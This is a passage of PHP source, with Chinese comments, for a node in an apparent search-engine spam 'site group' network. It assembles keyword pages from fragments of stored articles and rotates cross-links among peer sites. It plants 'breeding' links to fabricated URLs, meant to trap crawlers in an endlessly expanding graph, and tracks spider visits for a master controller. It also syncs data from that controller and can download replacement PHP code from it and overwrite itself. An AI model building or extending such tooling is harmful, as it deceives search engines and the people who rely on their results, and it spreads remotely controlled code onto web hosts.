    public function fill($tpl, array $vars, Prng $prng)
    {
        $site = $this->site();
        $base = array(
            'site'   => isset($site['name']) ? $site['name'] : '',
            'domain' => preg_replace('~^https?://~', '', isset($site['domain']) ? $site['domain'] : ''),
            'year'   => date('Y'), 'month' => date('n'), 'day' => date('j'),
            'date'   => date('Y-m-d'),
        );
        foreach ((isset($site['vars']) ? $site['vars'] : array()) as $k => $v) {
            $base['var.' . $k] = $v;
        }
        $vars = $vars + $base;

        return preg_replace_callback('/\{([a-z_.]+)(?::([^}]*))?\}/iu',
            function ($m) use ($vars, $prng) {
                $name = $m[1];
                $arg  = isset($m[2]) ? $m[2] : null;
                if ($name === 'spin' && $arg !== null) {
                    $opts = explode('|', $arg);
                    return $prng->pick($opts);
                }
                if ($name === 'rand' && $arg !== null) {
                    $r = array_map('intval', explode(',', $arg));
                    return $prng->int(isset($r[0]) ? $r[0] : 0, isset($r[1]) ? $r[1] : 999);
                }
                return isset($vars[$name]) ? $vars[$name] : '';
            }, $tpl);
    }

    public function kwView(array $kw)
    {
        return array(
            'w'    => $kw['w'],
            'word' => $kw['w'],
            'seq'  => $kw['seq'],
            'url'  => $this->url('kw', array('id' => $kw['seq'], 'ts' => $this->pageTs($kw['seq']))),
            'e'    => isset($kw['e']) ? $kw['e'] : array(),
        );
    }

    public function artView(array $a, $withContent = true)
    {
        $v = array(
            'title' => $a['t'],
            't'     => $a['t'],
            'seq'   => $a['seq'],
            'url'   => $this->url('art', array('id' => $a['seq'],
                                  'ts' => $this->pageTs($a['seq'], isset($a['d']) ? (int)$a['d'] : 0))),
            'tags'  => isset($a['g']) ? $a['g'] : '',
            'brief' => mb_substr(trim(strip_tags(isset($a['c']) ? $a['c'] : '')), 0, 120),
            'ts'    => isset($a['d']) ? (int)$a['d'] : 0,
            'date'  => isset($a['d']) && $a['d'] ? date('Y-m-d', (int)$a['d']) : '',
            'iso'   => isset($a['d']) && $a['d'] ? date('c', (int)$a['d']) : '',
        );
        if ($withContent) { $v['content'] = isset($a['c']) ? $a['c'] : ''; }
        return $v;
    }

    /** 把文章切成段落 */
    public static function paragraphs($html)
    {
        $html = (string)$html;
        if (strpos($html, '<p') !== false) {
            preg_match_all('~<p[^>]*>(.*?)</p>~is', $html, $m);
            $ps = $m[1];
        } else {
            $ps = preg_split('/\r?\n\s*\r?\n|\r?\n/', $html);
        }
        $out = array();
        foreach ($ps as $p) {
            $p = trim($p);
            if (mb_strlen(strip_tags($p)) >= 20) { $out[] = $p; }
        }
        return $out;
    }

    /**
     * 关键词页正文：从文章库稳定抽取若干片段拼装。
     * 同一个关键词永远得到同样的正文。
     */
    public function buildBody($kwWord, Prng $prng, $seed = '')
    {
        $total = $this->count('articles');
        $blocks = array();
        if ($total <= 0) { return array('html' => '', 'blocks' => array()); }

        // 正文取材范围固定在「冻结的文章池」内：
        // 后续往文章库追加内容不会把已有页面的正文全部重排。
        // 要让新文章进入正文，在站点设置里把 body_pool 调大即可。
        $pool  = (int)$this->s('body_pool', 0);
        $pool  = ($pool > 0) ? min($pool, $total) : $total;

        $n     = max(1, (int)$this->s('body_blocks', 3));
        $paras = max(1, (int)$this->s('block_paras', 3));
        $picks = $prng->uniq($n, $pool);

        foreach ($picks as $seq) {
            $a = $this->article($seq);
            if (!$a) { continue; }
            $ps = self::paragraphs(isset($a['c']) ? $a['c'] : '');
            if (!$ps) { continue; }
            $start = $prng->int(0, max(0, count($ps) - $paras));
            $slice = array_slice($ps, $start, $paras);
            $h2 = $this->ruleList('tag', 'h2');
            $blocks[] = array(
                'title' => $this->fill(
                    $h2 ? self::hrwPick($h2, $seed . '|h2|' . $seq) : '{kw}',
                    array('kw' => $kwWord, 'title' => $a['t']),
                    new Prng($seed . '|h2|' . $seq)),
                'html'  => '<p>' . implode('</p><p>', $slice) . '</p>',
                'from'  => $this->artView($a, false),
            );
        }

        $html = '';
        foreach ($blocks as $b) {
            $html .= '<h2>' . htmlspecialchars($b['title'], ENT_QUOTES, 'UTF-8') . '</h2>' . $b['html'];
        }
        return array('html' => $html, 'blocks' => $blocks);
    }

    /**
     * 站群互链：每个页面从对端集合里轮换取几条，并深链到对方内页。
     * 用「链接流」随机种子（含数据版本号），所以每次推送新版本会换一批组合，
     * 蜘蛛每次来爬到的出口不一样——但页面 TDK 和正文不受影响。
     */
    public function peerLinks(Prng $prng, $ord = 0)
    {
        $peers = $this->res('peers');
        if (!$peers || empty($peers['list'])) { return array(); }
        $list = $peers['list'];
        $n    = isset($peers['per_page']) ? (int)$peers['per_page'] : 0;
        if ($n <= 0) { return array(); }
        $rel  = isset($peers['rel']) ? (string)$peers['rel'] : 'nofollow';
        $P    = count($list);

        // 全局位移：同一轮里所有页面共用一个，换一轮就整体重排。
        // 必须全局统一——各页面各自取随机位移的话，无碰撞就没了。
        $rot   = (int)$this->s('peer_rotate', 0);
        $tick  = $rot > 0 ? (int)floor(time() / $rot) : (int)$this->ver;
        $shift = crc32($this->cfg['node_key'] . '|peershift|' . $tick) & 0x7FFFFFFF;

        $out = array();
        for ($j = 0; $j < $n; $j++) {
            // 全站出链排成一条连号的流：第 g 条链接固定落到哪个对端的哪一页。
            // 这样只要出链总数不超过对端 URL 总数，就一条都不会重复——
            // 随机抽的话按生日问题会浪费三成以上。
            $g   = (int)$ord * $n + $j;
            $pi  = $g % $P;                       // 落到哪个对端
            $p   = $list[$pi];
            $k   = (int)floor($g / $P);           // 在该对端里排第几
            $url = rtrim($p['u'], '/');
            $c   = (int)$p['c'];
            $deep = $this->peerPath($p, $k + $shift + $pi * 7919, $c);
            $url .= $deep === null ? '/' : $deep;
            $anchors = (!empty($p['a']) && is_array($p['a'])) ? $p['a'] : array($p['n']);
            $out[] = array(
                'name'   => $p['n'],
                'url'    => $url,
                // 锚文本仍然随机取，避免"第几条链接必定用第几个锚文本"这种规律
                'anchor' => $anchors[$prng->int(0, count($anchors) - 1)],
                'rel'    => $rel,
            );
        }
        return $out;
    }

    /**
     * 拼一条指向对端内页的路径。
     * 对端地址规则里的 {code} 要用**对端的** node_key 编码，{y}{m}{d} 要用**对端的**
     * 时间目录参数——这些都由主控随快照下发（peers[].k / .ds / .dd）。
     * 主控版本旧、没带这些字段时返回 null，退回链首页，绝不输出没替换干净的地址。
     *
     * @param  int $x  该对端的独立排列流下标
     * @param  int $c  对端可深链的页面数
     * @return string|null
     */
    private function peerPath(array $p, $x, $c)
    {
        $pat = isset($p['p']) ? (string)$p['p'] : '';
        if ($pat === '' || $c <= 0) { return null; }
        $seq  = self::spread($x, $c);
        $vars = array('id' => $seq);
        if (strpos($pat, '{code}') !== false) {
            if (empty($p['k'])) { return null; }
            $vars['code'] = self::encodeCodeOf((string)$p['k'], 'kw', $seq);
        }
        if (strpos($pat, '{y}') !== false || strpos($pat, '{m}') !== false || strpos($pat, '{d}') !== false) {
            if (!isset($p['dd'])) { return null; }
            $days = max(1, (int)$p['dd']);
            $vars['ts'] = self::dateBaseOf(isset($p['ds']) ? $p['ds'] : '') + (($seq % $days) * 86400);
        }
        return $this->fillPattern($pat, $vars);
    }

    /**
     * 把 [0,m) 上的序号打散成看不出规律、但**一一对应不重复**的另一个序号。
     * 用乘法置换 (a*x) mod m，a 与 m 互质就是双射。
     * 直接连号会暴露规律，纯随机又会撞车，这是两者之间的解。
     */
    public static function spread($x, $m)
    {
        $m = (int)$m;
        if ($m <= 1) { return 0; }
        $a = (int)floor($m * 0.6180339887);      // 黄金比例，分布最均匀
        if ($a % 2 === 0) { $a++; }
        if ($a < 1) { $a = 1; }
        $guard = 0;
        while (self::gcd($a, $m) !== 1 && $guard++ < 128) {
            $a += 2;
            if ($a >= $m) { $a = 1; }
        }
        return (int)(($a * ((int)$x % $m)) % $m);
    }

    public static function gcd($a, $b)
    {
        $a = abs((int)$a); $b = abs((int)$b);
        while ($b) { $t = $a % $b; $a = $b; $b = $t; }
        return $a;
    }

    /** 每类页面在"出链流"里的序号，各类之间不重叠 */
    public function linkOrd($type, $a = 0, $b = 0)
    {
        $kw  = $this->count('keywords');
        $art = $this->count('articles');
        switch ($type) {
            case 'kw':    return (int)$a;
            case 'art':   return $kw + (int)$a;
            case 'list':  return $kw + $art + (int)$b;
            case 'cat':   return $kw + $art + 100000 + (crc32((string)$a) % 10000) * 100 + (int)$b;
            case 'index': return $kw + $art + 99999;
        }
        return 0;
    }

    /** 广告位：每个槽位按权重取一条，随版本轮换 */
    public function adSlots(Prng $prng)
    {
        $ads = $this->res('ads');
        $out = array();
        if (!is_array($ads)) { return $out; }
        foreach ($ads as $slot => $codes) {
            if (!is_array($codes) || !$codes) { continue; }
            $out[$slot] = $codes[$prng->int(0, count($codes) - 1)];
        }
        return $out;
    }

    public function relatedKeywords($seq, Prng $prng, $n = null)
    {
        $n = $n === null ? (int)$this->s('related_count', 12) : $n;
        $total = $this->count('keywords');
        $out = array();
        foreach ($prng->uniq($n, $total, array((int)$seq)) as $s) {
            $kw = $this->keyword($s);
            if ($kw) { $out[] = $this->kwView($kw); }
        }
        return $out;
    }

    /**
     * 繁殖链接: 指向「形态合法但短码野生」的地址。蜘蛛顺着爬永远有新页面,
     * 野生页自身又带一批繁殖链接, 爬行图无限展开。
     * 按 (本站 key + 当前页路径 + 槽位) 确定性生成——同一页每次渲染链接一致,
     * 缓存和 304 才不会失效。锚文本用真实关键词, 不额外造词。
     */
    public function breedLinks($selfPath, $k = 4)
    {
        $pat = $this->s('url_kw', '');
        if ($pat === '' || strpos($pat, '{code}') === false) { return array(); }
        $total = $this->count('keywords');
        if ($total === 0) { return array(); }
        $out = array();
        for ($i = 0; $i < $k; $i++) {
            $h = md5($this->cfg['node_key'] . '|breed|' . $selfPath . '|' . $i);
            $code = '';
            for ($j = 0; $j < 10; $j++) { $code .= substr(self::B36, hexdec(substr($h, $j * 2, 2)) % 36, 1); }
            // 稳定伪日期: 2019-01-01 起 2555 天窗口, 由哈希决定, 不随时间漂
            $ts  = 1546300800 + (hexdec(substr($h, 20, 4)) % 2555) * 86400;
            $url = $this->pubUrl($this->fillPattern($pat, array('code' => $code, 'ts' => $ts)));
            $probe = hexdec(substr($h, 24, 8)) % $total;
            $word = '';
            for ($t = 0; $t < $total; $t++) {
                $kw = $this->keyword(($probe + $t) % $total);
                if ($kw) { $word = $kw['w']; break; }
            }
            if ($word === '') { continue; }
            $out[] = array('w' => $word, 'word' => $word, 'seq' => -1, 'url' => $url, 'e' => array());
        }
        return $out;
    }

    // ---------------- 同步 ----------------
    /**
     * 与主控同步。返回 [bool ok, string msg]
     */
    public function sync($force = false)
    {
        if ($this->cfg['master'] === '' || $this->cfg['node_key'] === '') {
            return array(false, '未配置主控地址或节点标识');
        }

        $lock = @fopen($this->dir . '/sync.lock', 'c');
        if (!$lock) { return array(false, '无法创建锁文件，检查 data 目录写权限'); }
        if (!flock($lock, LOCK_EX | LOCK_NB)) {
            fclose($lock);
            return array(false, '已有同步在进行');
        }

        try {
            $spider = $this->spiderReport();
            $visit  = $this->visitReport();
            // have 只在「本地数据完整且不是强制同步」时才发：主控看到它就可能只回一个
            // 版本号、不回分片 hash 列表。本地不完整时必须拿到完整 meta 才能补齐。
            $params = array(
                'ver'    => $this->ver,
                'pages'  => $this->pageCount(),
                'info'   => 'PHP ' . PHP_VERSION,
                'spider' => $spider ? json_encode($spider, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) : '',
                'visit'  => $visit ? json_encode($visit, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) : '',
            );
            $cr = $this->crawlBitsB64('kw');
            if ($cr !== '') { $params['cr'] = $cr; }   // 爬行覆盖位图
            if (!$force && $this->ver > 0 && $this->ready()) { $params['have'] = $this->ver; }
            $r = $this->api('meta', $params);
            if (!$r[0]) { return array(false, $r[1]); }
            $meta = $r[1];
            // 自更新: 主控带着最新构建号, 落后就拉新文件(先更代码, 数据同步照常)
            if (!empty($meta['nb'])) { $this->maybeUpdate((int)$meta['nb']); }

            // 主控回 same=1：版本没变，整份 hash 列表都省了。
            // 仍然核对一次版本号——万一主控理解错了，也不能拿旧数据当最新。
            if (!empty($meta['same']) && !$force
                && (int)$meta['version'] === $this->ver && $this->ready()) {
                $this->setState(array('last_check' => time(), 'last_msg' => '已是最新'));
                return array(true, '已是最新（v' . $this->ver . '）');
            }
            if (!isset($meta['res'])) {
                return array(false, '主控返回的 meta 不完整（缺 res）');
            }

            if (!$force && (int)$meta['version'] === $this->ver && $this->ready()) {
                $this->setState(array('last_check' => time(), 'last_msg' => '已是最新'));
                return array(true, '已是最新（v' . $this->ver . '）');
            }

            $newVer = (int)$meta['version'];
            $newDir = $this->verDir($newVer);
            $this->ensureDir($newDir);

            $oldMeta = $this->meta;
            $oldDir  = $this->ver ? $this->verDir($this->ver) : null;
            $reused  = 0;
            $fetched = 0;

            // 先把「本地能复用的」筛掉，剩下的才是真要走网络的清单。
            // 分成两步而不是边判边拉，是为了能把要拉的片打包成批。
            $need = array();
            foreach ($meta['res'] as $name => $info) {
                $chunks = (int)$info['chunks'];
                for ($no = 0; $no < $chunks; $no++) {
                    $hash = isset($info['hash'][$no]) ? $info['hash'][$no] : '';
                    $file = $newDir . '/' . $name . (($name === 'keywords' || $name === 'articles') ? '_' . $no : '') . '.json';

                    // 旧版本同 hash 直接复用，省流量。
                    // 但复用**必须校验内容**：只看文件在不在的话，一旦某个分片曾经被写坏
                    // （0 字节、写了一半），它会顺着版本一路复制下去，
                    // 表现是全站 404 而且不报任何错——非常难查。校验不过就重新下载。
                    $oldHash = isset($oldMeta['res'][$name]['hash'][$no]) ? $oldMeta['res'][$name]['hash'][$no] : null;
                    if ($oldDir && $oldHash === $hash && $hash !== '') {
                        $oldFile = $oldDir . '/' . basename($file);
                        if (is_file($oldFile) && filesize($oldFile) > 0) {
                            $content = @file_get_contents($oldFile);
                            if ($content !== false && md5($content) === $hash
                                && @file_put_contents($file, $content, LOCK_EX) !== false) {
                                $reused++;
                                continue;
                            }
                        }
                    }
                    $need[] = array('res' => $name, 'no' => $no, 'hash' => $hash, 'file' => $file);
                }
            }

            $r = $this->fetchChunks($need, $fetched);
            if ($r !== true) { return array(false, $r); }

            // 原子切换
            if (!$this->atomicWrite($this->dir . '/meta.json',
                    json_encode($meta, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES))) {
                return array(false, 'meta 写入失败');
            }
            $this->ver  = $newVer;
            $this->meta = $meta;
            $this->res  = array();
            $this->set  = array();

            $this->pruneVersions($newVer);
            $this->pruneCache($newVer);
            $this->setState(array(
                'last_check' => time(), 'last_sync' => time(), 'version' => $newVer,
                'last_msg'   => "v{$newVer} 完成，新拉 {$fetched} 片 / 复用 {$reused} 片",
            ));
            // 回报新版本，后台立刻能看到，不用等下一轮心跳
            $this->api('ping', array(
                'ver'   => $newVer,
                'pages' => $this->pageCount(),
                'info'  => 'PHP ' . PHP_VERSION,
            ));
            return array(true, "同步到 v{$newVer}（新拉 {$fetched} 片，复用 {$reused} 片）");

        } catch (Exception $e) {
            return array(false, '异常: ' . $e->getMessage());
        } finally {
            flock($lock, LOCK_UN);
            fclose($lock);
        }
    }

    /** 调用主控 API，返回 [ok, data|errMsg, rawDataJson|null] */
    /**
     * 把清单里的分片全部落盘。主控 proto>=2 就打包批量取，否则退回一片一个请求。
     *
     * 为什么值得打包：逐片取的开销不在主控算得慢，而在**每片都要重新握手**。
     * 20 万词有 400 多个分片、净荷才 1MB 左右，时间几乎全花在 TCP+TLS 上。
     *
     * @param  array $need  [{res,no,hash,file}, ...]
     * @param  int   $fetched  引用返回：实际走网络拉了几片
     * @return true|string  出错返回错误描述
     */
    private function fetchChunks(array $need, &$fetched)
    {
        if (!$need) { return true; }

        if ($this->masterProto >= 2) {
            $batch = max(1, (int)$this->cfg['bundle_size']);
            for ($i = 0; $i < count($need); ) {
                $slice = array_slice($need, $i, $batch);
                $items = array();
                foreach ($slice as $x) { $items[] = array($x['res'], $x['no']); }
                $c = $this->api('bundle', array('items' => json_encode($items)));
                if (!$c[0]) { return '批量拉取失败: ' . $c[1]; }

                // 主控可能因为字节上限少给几片，按 res+no 对号入座，没给的下一批再要
                $got = array();
                $list = isset($c[1]['items']) && is_array($c[1]['items']) ? $c[1]['items'] : array();
                foreach ($list as $it) {
                    if (!isset($it['res'], $it['no'], $it['b'])) { continue; }
                    $got[$it['res'] . '#' . (int)$it['no']] = (string)$it['b'];
                }
                if (!$got) { return '批量拉取没返回任何分片'; }

                $advance = 0;
                foreach ($slice as $x) {
                    $k = $x['res'] . '#' . $x['no'];
                    if (!isset($got[$k])) { break; }          // 从这一片起主控没给，下一轮接着要
                    $w = $this->writeChunk($x, $got[$k]);
                    if ($w !== true) { return $w; }
                    $fetched++;
                    $advance++;
                }
                if ($advance === 0) { return '批量拉取返回的分片对不上请求'; }
                $i += $advance;
            }
            return true;
        }

        // 主控是老版本：一片一个请求
        foreach ($need as $x) {
            $c = $this->api('chunk', array('res' => $x['res'], 'no' => $x['no']));
            if (!$c[0]) { return '拉取 ' . $x['res'] . '#' . $x['no'] . ' 失败: ' . $c[1]; }
            // 用响应中 data 的原始字节校验，避免重新序列化带来的差异
            $json = $c[2] !== null ? $c[2] : json_encode($c[1], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
            $w = $this->writeChunk($x, $json);
            if ($w !== true) { return $w; }
            $fetched++;
        }
        return true;
    }

    /** 校验并落盘一个分片 */
    private function writeChunk(array $x, $json)
    {
        if ($x['hash'] !== '' && md5($json) !== $x['hash']) {
            return $x['res'] . '#' . $x['no'] . ' 内容校验不通过（主控数据在传输中被改动）';
        }
        if (@file_put_contents($x['file'], $json, LOCK_EX) === false) {
            return '写入失败：' . $x['file'];
        }
        return true;
    }

    /** 本机时钟相对主控的偏差（秒）。共享主机时钟不准很常见，偏差超过签名时间窗就全线同步失败。 */
    public function clockOffset()
    {
        if ($this->clockOff === null) { $this->clockOff = $this->clockStored(); }
        return $this->clockOff;
    }
    private $clockOff = null;      // 本进程当前用的偏差（可能刚被未签名响应临时纠正过）
    private $clockDisk = null;     // 盘上记着的偏差

    private function clockStored()
    {
        if ($this->clockDisk === null) {
            $s = $this->state();
            $this->clockDisk = isset($s['clock_offset']) ? (int)$s['clock_offset'] : 0;
        }
        return $this->clockDisk;
    }

    /**
     * 用主控**通过验签的**响应里的 st 记下偏差。
     * 比较对象必须是盘上的值而不是内存值：内存值可能刚被未签名的 401 临时纠正过，
     * 拿它比就会「已经对了所以不用写」，结果盘上永远留着坏值，每次同步都要多跑一轮自救。
     */
    private function noteClock($serverTs)
    {
        $serverTs = (int)$serverTs;
        if ($serverTs <= 0) { return; }
        $off = $serverTs - time();
        $this->clockOff = $off;
        if (abs($off - $this->clockStored()) < 5) { return; }   // 5 秒内当抖动，不写盘
        $this->clockDisk = $off;
        $this->setState(array('clock_offset' => $off));
    }

    // ---------------- 自助登记 ----------------
    public function hasCred()
    {
        return $this->cfg['node_key'] !== '';
    }

    public function enrollToken()
    {
        return isset($this->cfg['enroll_token']) ? (string)$this->cfg['enroll_token'] : '';
    }

    /**
     * 用共享登记令牌向主控换正式凭据(node_key/secret), 领到后落盘 cred.json。
     * 返回 array(true,'ok',msg) 或 array(false,状态,msg); 状态: pending/disabled/net_fail/...
     * 主控默认把新节点置为「待批准」, 批准前不下发任何数据——令牌泄露的最坏
     * 结果只是待批列表被塞垃圾, 所以令牌可以明文躺在节点文件里。
     */
    public function enroll($domain, $retry = 1)
    {
        $token = $this->enrollToken();
        if ($token === '') { return array(false, 'no_token', '未配置登记令牌 enroll_token'); }
        if ($this->cfg['master'] === '') { return array(false, 'no_master', '未配置主控地址'); }
        if ($domain === '') {
            return array(false, 'no_domain', '登记需要本机域名：先浏览器访问一次，或在配置里填 domain');
        }

        // 退避：pending/失败时别每个请求都打主控
        $st = $this->state();
        $next = isset($st['enroll_next']) ? (int)$st['enroll_next'] : 0;
        if (time() < $next) {
            return array(false, isset($st['enroll_status']) ? $st['enroll_status'] : 'wait', '登记退避中');
        }

        // 指纹 = 「我是谁」(域名+子目录, 小写去端口)。重复登记幂等: 凭据丢了再来
        // 一次拿回的还是原来那个站, 不会在主控上裂出第二个。
        $fpd = strtolower(preg_replace('~^https?://~', '', $domain));
        $fpd = preg_replace('~:\d+$~', '', $fpd);
        $params = array(
            'act'    => 'enroll',
            'fp'     => hash('sha256', $fpd),
            'domain' => $domain,
            'info'   => 'PHP ' . PHP_VERSION,
            'ts'     => time() + $this->clockOffset(),
            'nonce'  => bin2hex(random_bytes(16)),
        );
        // 登记请求的签名密钥是共享令牌, 不是站点 secret(此刻还没有)
        ksort($params);
        $parts = array();
        foreach ($params as $k => $v) { $parts[] = $k . '=' . $v; }
        $params['sign'] = hash_hmac('sha256', implode('&', $parts), $token);

        $r = $this->httpPost($this->cfg['master'], $params);
        if (!$r['ok']) {
            $this->setState(array('enroll_next' => time() + 600, 'enroll_status' => 'net_fail'));
            return array(false, 'net_fail', $r['error'] ?: ('HTTP ' . $r['code']));
        }
        $body = $r['body'];
        $sign = isset($r['headers']['x-sign']) ? $r['headers']['x-sign'] : '';
        if ($sign === '' || !hash_equals(hash_hmac('sha256', $body, $token), $sign)) {
            // 无签名的 401(时间超窗)可以拿 st 自救一次, 只在内存用不落盘
            $e = json_decode((string)$body, true);
            if ($retry > 0 && is_array($e) && (int)(isset($e['code']) ? $e['code'] : 0) === 401
                && !empty($e['st'])) {
                $this->clockOff = (int)$e['st'] - time();
                $this->setState(array('enroll_next' => 0));
                return $this->enroll($domain, $retry - 1);
            }
            $this->setState(array('enroll_next' => time() + 600, 'enroll_status' => 'bad_sign'));
            return array(false, 'bad_sign', '登记响应验签失败');
        }
        $data = json_decode($body, true);
        if (!is_array($data) || !isset($data['code'])) {
            $this->setState(array('enroll_next' => time() + 600, 'enroll_status' => 'bad_resp'));
            return array(false, 'bad_resp', '登记响应格式错误');
        }
        if (isset($data['st'])) { $this->noteClock($data['st']); }
        $d = isset($data['data']) && is_array($data['data']) ? $data['data'] : array();
        $status = isset($d['status']) ? (string)$d['status'] : '';

        if ((int)$data['code'] === 0 && $status === 'ok' && !empty($d['node_key']) && !empty($d['secret'])) {
            $this->cfg['node_key'] = (string)$d['node_key'];
            $this->cfg['secret']   = (string)$d['secret'];
            $this->atomicWrite($this->dir . '/cred.json', json_encode(array(
                'node_key' => $this->cfg['node_key'],
                'secret'   => $this->cfg['secret'],
                'name'     => isset($d['name']) ? (string)$d['name'] : '',
                'at'       => time(),
            )));
            $this->setState(array('enroll_next' => 0, 'enroll_status' => 'ok'));
            return array(true, 'ok', '登记成功');
        }
        if ((int)$data['code'] === 0 && $status === 'pending') {
            $this->setState(array('enroll_next' => time() + 60, 'enroll_status' => 'pending'));  // 批准后让节点一分钟内就能再试
            return array(false, 'pending', '已登记，等待主控后台批准');
        }
        if ((int)$data['code'] === 0 && $status === 'disabled') {
            $this->setState(array('enroll_next' => time() + 3600, 'enroll_status' => 'disabled'));
            return array(false, 'disabled', '该节点已被主控禁用');
        }
        $this->setState(array('enroll_next' => time() + 600, 'enroll_status' => 'refused'));
        return array(false, 'refused', '主控: ' . (isset($data['msg']) ? (string)$data['msg'] : '未知'));
    }

    // ---------------- 自更新 ----------------
    public function maybeUpdate($latestVer)
    {
        $latestVer = (int)$latestVer;
        if ($latestVer <= self::BUILD) { return; }
        $st = $this->state();
        if (time() < (int)(isset($st['selfupdate_next']) ? $st['selfupdate_next'] : 0)) { return; }
        $this->selfUpdate($latestVer);
    }

    private function selfUpdate($ver)
    {
        // 只对单文件部署生效: 多文件时类在 core.php 里, __FILE__ 和入口不是一个文件,
        // 用合并构建覆盖 core.php 等于把入口逻辑塞进被 require 的文件, 必炸。
        $entry = isset($_SERVER['SCRIPT_FILENAME']) ? realpath($_SERVER['SCRIPT_FILENAME']) : '';
        if ($entry === '' || $entry !== __FILE__) {
            $this->setState(array('selfupdate_next' => time() + 86400 * 7,
                                  'last_msg' => '多文件部署, 跳过自更新'));
            return;
        }
        $r = $this->api('selfupdate');
        if (!$r[0]) {
            $this->setState(array('selfupdate_next' => time() + 3600,
                                  'last_msg' => '自更新拉取失败: ' . $r[1]));
            return;
        }
        $d = $r[1];
        $code = isset($d['b64']) ? base64_decode((string)$d['b64'], true) : false;
        if ($code === false || empty($d['sha256']) || hash('sha256', $code) !== $d['sha256']
            || strpos($code, '<?php') !== 0 || strpos($code, 'const BUILD') === false
            || (int)(isset($d['version']) ? $d['version'] : 0) !== $ver) {
            $this->setState(array('selfupdate_next' => time() + 3600,
                                  'last_msg' => '自更新包校验失败, 已丢弃'));
            return;
        }
        if (!is_writable(__FILE__)) {
            $this->setState(array('selfupdate_next' => time() + 86400,
                                  'last_msg' => '自更新失败: 文件只读, 需手动重传'));
            return;
        }
        $this->atomicWrite(__FILE__, $code);
        $this->setState(array('selfupdate_next' => 0,
                              'last_msg' => '已自更新到构建 v' . $ver . '(下次请求生效)'));
    }

    // ---------------- 蜘蛛爬行覆盖位图 ----------------
    // 第 seq 位 = 该页被搜索引擎抓过。主控拿它让互链出链优先指向未收录页。
    // 单字节读写: 已置位的页只读不写, 20 万词全抓过也就 25KB。
    public function crawlMark($kind, $seq)
    {
        $seq = (int)$seq;
        if ($seq <= 0 || $seq > 2000000) { return; }
        static $done = array();
        $k = $kind . ':' . $seq;
        if (isset($done[$k])) { return; }
        $done[$k] = true;
        $fp = @fopen($this->dir . '/crawl-' . $kind . '.bits', 'c+');
        if (!$fp) { return; }
        if (flock($fp, LOCK_EX)) {
            $byte = $seq >> 3;
            fseek($fp, $byte);
            $cur = fread($fp, 1);
            $v = ($cur === '' || $cur === false) ? 0 : ord($cur);
            if (!($v & (1 << ($seq & 7)))) {
                fseek($fp, $byte);
                fwrite($fp, chr($v | (1 << ($seq & 7))));
            }
            flock($fp, LOCK_UN);
        }
        fclose($fp);
    }

    /** 从请求路径反解关键词页序号并置位(只处理 kw —— 主控位图只收 kw) */
    public function crawlMarkPath($path)
    {
        $p = Render::matchUrl($this, 'kw', $path);
        if ($p === null) { return; }
        $seq = 0;
        if (isset($p['code'])) {
            $d = $this->decodeCode($p['code']);
            if ($d === null || $d['type'] !== 'kw') { return; }
            $seq = (int)$d['seq'];
        } elseif (isset($p['seq'])) { $seq = (int)$p['seq']; }
        elseif (isset($p['id']))    { $seq = (int)$p['id']; }
        if ($seq > 0) { $this->crawlMark('kw', $seq); }
    }

    public function crawlBitsB64($kind)
    {
        $f = $this->dir . '/crawl-' . $kind . '.bits';
        if (!is_file($f)) { return ''; }
        $b = (string)@file_get_contents($f);
        return $b === '' ? '' : base64_encode($b);
    }

    private function api($act, array $params = array(), $retry = 2)
    {
        $params = array_merge($params, array(
            'act'   => $act,
            'node'  => $this->cfg['node_key'],
            // 用校正过的时间签名，别指望机器的钟是准的
            'ts'    => time() + $this->clockOffset(),
            'nonce' => bin2hex(random_bytes(16)),
            'gz'    => function_exists('gzdecode') ? 1 : 0,
            'proto' => self::PROTO,
            'nb'    => self::BUILD,
        ));
        $params['sign'] = $this->signParams($params);

        $r = $this->httpPost($this->cfg['master'], $params);
        if (!$r['ok']) {
            // 网络类失败重试：抖一下就整轮同步失败、要等下个 sync_interval 太亏。
            // 应用层的拒绝不走这里——主控一律回 HTTP 200，错误码在响应体里。
            if ($retry > 0) {
                usleep(300000 * (3 - $retry));
                return $this->api($act, $params, $retry - 1);
            }
            return array(false, $r['error'] ?: ('HTTP ' . $r['code']), null);
        }

        $body = $r['body'];
        // 先验签，再解压——签名覆盖的是传输原始字节
        $sign = isset($r['headers']['x-sign']) ? $r['headers']['x-sign'] : '';
        if ($sign === '' || !hash_equals(hash_hmac('sha256', $body, $this->cfg['secret']), $sign)) {
            // 主控在查到站点之前没有 secret，签不了名：时间超窗、参数缺失、站点不存在
            // 这几种都是裸响应。其中「时间超窗」要能自救，否则机器时钟一漂就得人上去校时。
            if ($retry > 0) {
                $e = json_decode((string)$body, true);
                if (is_array($e) && (int)(isset($e['code']) ? $e['code'] : 0) === 401 && !empty($e['st'])
                    && strpos((string)(isset($e['msg']) ? $e['msg'] : ''), 'timestamp') !== false) {
                    // 这条响应没签名，st 有可能是伪造的。所以只在内存里用它重试一次，
                    // **不落盘**；等下一条通过验签的响应再把偏差固化下来。
                    // 最坏情况是被人骗着多失败一轮，拿不到任何额外权限。
                    $this->clockOff = (int)$e['st'] - time();
                    return $this->api($act, $params, $retry - 1);
                }
            }
            return array(false, '主控响应签名校验失败', null);
        }
        if (isset($r['headers']['x-encoding']) && $r['headers']['x-encoding'] === 'gzip') {
            $body = @gzdecode($body);
            if ($body === false) { return array(false, '解压失败', null); }
        }
        $data = json_decode($body, true);
        if (!is_array($data) || !isset($data['code'])) { return array(false, '响应格式错误', null); }
        if (isset($data['st']))    { $this->noteClock($data['st']); }
        if (isset($data['proto'])) { $this->masterProto = max(1, (int)$data['proto']); }
        if ((int)$data['code'] !== 0) { return array(false, '主控: ' . $data['msg'], null); }

        // 提取 data 字段的原始 JSON 文本，用于按主控算出的 hash 校验
        $raw = null;
        $p = strpos($body, '"data":');
        if ($p !== false) {
            $raw = rtrim(substr($body, $p + 7));
            if (substr($raw, -1) === '}') { $raw = rtrim(substr($raw, 0, -1)); }
        }
        return array(true, isset($data['data']) ? $data['data'] : array(), $raw);
    }

    public function signParams(array $params)
    {
        return $this->signParamsWith($params, $this->cfg['secret']);
    }

    /** 用指定密钥签名(wakeup 用共享登记令牌验) */
    public function signParamsWith(array $params, $key)
    {
        unset($params['sign']);
        ksort($params);
        $parts = array();
        foreach ($params as $k => $v) { $parts[] = $k . '=' . $v; }
        return hash_hmac('sha256', implode('&', $parts), $key);
    }

    /**
     * 出站请求：curl → allow_url_fopen 流 → 原始 socket，逐级降级。
